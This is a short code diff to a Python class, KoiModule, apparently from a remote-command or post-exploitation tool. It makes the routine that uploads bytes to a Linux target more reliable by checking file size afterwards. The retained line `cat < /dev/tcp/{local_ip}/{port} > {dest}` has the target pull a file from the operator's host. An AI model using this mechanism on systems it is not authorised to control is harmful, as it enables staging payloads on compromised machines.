@@ -330,9 +330,17 @@ class KoiModule(ABC):
         """Transfer *raw* bytes to *dest* on a Linux target via /dev/tcp."""
         local_ip = self._get_local_ip()
         port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
-        self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {dest}", timeout=timeout)
+        result = self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {dest}", timeout=timeout)
         thread.join(timeout=timeout)
-        return not errors
+
+        if errors or not result.success:
+            return False
+
+        size_str = self._try_exec(f"wc -c < {dest} 2>/dev/null")
+        try:
+            return int(size_str.split()[0]) == len(raw)
+        except (ValueError, IndexError):
+            return False
 
     def _upload_bytes_win(
         self,
